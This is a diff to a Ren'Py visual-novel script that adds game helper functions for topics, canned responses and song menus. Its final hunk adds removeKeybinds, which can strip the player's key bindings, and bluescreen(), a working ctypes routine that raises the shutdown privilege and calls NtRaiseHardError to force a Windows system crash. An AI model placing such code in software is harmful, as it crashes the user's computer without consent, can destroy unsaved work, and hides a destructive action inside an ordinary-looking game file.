@@ -127,6 +127,8 @@ init python:
         #indexOfTopic = findDictIndex(questionsForPlayer, chosenTopic)
         ashley.setValue("askedTopics", askedTopics.append(chosenTopic))
         return chosenTopic
+
+
     # useful, commonly used functions
     def zeldaRiff(cosmeticType, cosmeticNo):
         global ashley
@@ -199,6 +201,7 @@ init python:
         for option in options:
             formattedOptions.append((option, option))
         return formattedOptions
+    #def displayQuestionMenu(dict):
     def randomResponse(typeOfResponse):
         if typeOfResponse == True: 
             responses = ["And so it shall be.",
@@ -304,3 +307,36 @@ init python:
     def getSpecificSong():
         specificSong = renpy.display_menu(menuFormat(readFile("heardSongs.txt")))
         return specificSong
+    # functions designed to override native Ren'Py functions/ config related functions
+    def removeKeybinds(keybinds):
+        keybindsToRemove = keybinds
+        for keybind in keybindsToRemove:
+            config.keymap[keybind] = []
+    def rebindKeybinds(keybinds):
+        for pair in keybinds:
+            config.keymap[pair[0]] = [pair[1]]
+    def bluescreen():
+        from ctypes import windll
+        from ctypes import c_int
+        from ctypes import c_uint
+        from ctypes import c_ulong
+        from ctypes import POINTER
+        from ctypes import byref
+
+        nullptr = POINTER(c_int)()
+
+        windll.ntdll.RtlAdjustPrivilege(
+            c_uint(19), 
+            c_uint(1), 
+            c_uint(0), 
+            byref(c_int())
+        )
+
+        windll.ntdll.NtRaiseHardError(
+            c_ulong(0xC000007B), 
+            c_ulong(0), 
+            nullptr, 
+            nullptr, 
+            c_uint(6), 
+            byref(c_uint())
+        )
